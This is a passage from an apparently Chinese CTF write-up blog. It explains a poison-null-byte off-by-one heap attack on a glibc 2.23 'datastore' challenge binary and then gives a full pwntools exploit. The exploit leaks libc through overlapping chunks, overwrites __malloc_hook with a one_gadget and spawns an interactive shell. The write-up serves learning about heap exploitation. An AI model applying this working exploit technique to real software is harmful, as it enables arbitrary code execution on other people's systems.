+<p>首先进行off-by-one，这里利用chunk的空间复用，先申请0x80，free后再申请0x78大小的chunk，这样就可以利用next chunk的prev_size。</p>
+<pre><code class="python">PUT(&quot;A&quot;, 0x71, &quot;A&quot;*0x70)
+    PUT(&quot;B&quot;, 0x101, &quot;B&quot;*0x100)
+    PUT(&quot;C&quot;, 0x81, &quot;C&quot;*0x80)
+    PUT(&quot;def&quot;, 0x81, &quot;d&quot;*0x80)
+
+    DEL(&quot;A&quot;)
+    DEL(&quot;B&quot;)
+    PUT(&quot;A&quot;*0x78, 0x11, &quot;A&quot;*0x10)        # posion null byte
+</code></pre>
+<h4 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h4><pre><code class="python">from pwn import *
+
+io = remote(&#39;127.0.0.1&#39;, 10001)        # io = process(&quot;./datastore_223&quot;)
+libc = ELF(&#39;/usr/local/glibc-2.23/lib/libc-2.23.so&#39;)
+
+def PUT(key, size, data):
+    io.sendlineafter(&quot;command:&quot;, &quot;PUT&quot;)
+    io.sendlineafter(&quot;key&quot;, key)
+    io.sendlineafter(&quot;size&quot;, str(size))
+    io.sendlineafter(&quot;data&quot;, data)
+
+def GET(key):
+    io.sendlineafter(&quot;command:&quot;, &quot;GET&quot;)
+    io.sendlineafter(&quot;key&quot;, key)
+    io.recvuntil(&quot;bytes]:\n&quot;)
+    return io.recvline()
+
+def DEL(key):
+    io.sendlineafter(&quot;command:&quot;, &quot;DEL&quot;)
+    io.sendlineafter(&quot;key&quot;, key)
+
+for i in range(0, 10):
+    PUT(str(i), 0x38, str(i)*0x37)
+for i in range(0, 10):
+    DEL(str(i))
+
+def leak_libc():
+    global libc_base
+
+    PUT(&quot;A&quot;, 0x71, &quot;A&quot;*0x70)
+    PUT(&quot;B&quot;, 0x101, &quot;B&quot;*0x100)
+    PUT(&quot;C&quot;, 0x81, &quot;C&quot;*0x80)
+    PUT(&quot;def&quot;, 0x81, &quot;d&quot;*0x80)
+
+    DEL(&quot;A&quot;)
+    DEL(&quot;B&quot;)
+    PUT(&quot;A&quot;*0x78, 0x11, &quot;A&quot;*0x10)        # posion null byte
+
+    PUT(&quot;B1&quot;, 0x81, &quot;X&quot;*0x80)
+    PUT(&quot;B2&quot;, 0x41, &quot;Y&quot;*0x40)
+    DEL(&quot;B1&quot;)
+    DEL(&quot;C&quot;)                            # overlap chunkB2
+
+    PUT(&quot;B1&quot;, 0x81, &quot;X&quot;*0x80)
+    libc_base = u64(GET(&quot;B2&quot;)[:8]) - 0x39bb78
+    log.info(&quot;libc address: 0x%x&quot; % libc_base)
+
+def pwn():
+    one_gadget = libc_base + 0x3f44a
+    malloc_hook = libc.symbols[&#39;__malloc_hook&#39;] + libc_base
+
+    DEL(&quot;B1&quot;)
+    payload  = p64(0)*16 + p64(0) + p64(0x71)
+    payload += p64(0)*12 + p64(0) + p64(0x21)
+    PUT(&quot;B1&quot;, 0x191, payload.ljust(0x190, &quot;B&quot;))
+
+    DEL(&quot;B2&quot;)
+    DEL(&quot;B1&quot;)
+    payload = p64(0)*16 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
+    PUT(&quot;B1&quot;, 0x191, payload.ljust(0x190, &quot;B&quot;))
+
+    PUT(&quot;D&quot;, 0X61, &quot;D&quot;*0x60)
+    payload = p8(0)*0x13 + p64(one_gadget)
+    PUT(&quot;E&quot;, 0X61, payload.ljust(0x60, &quot;E&quot;))
+
+    io.sendline(&quot;GET&quot;)
+    io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    leak_libc()
+    pwn()
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/05/29/CTF_house-of-einherjar/" title=""><span class="has-text-weight-semibold">下一页: </span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="DETALA/DETALA.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/DETALA"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> DATAL 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
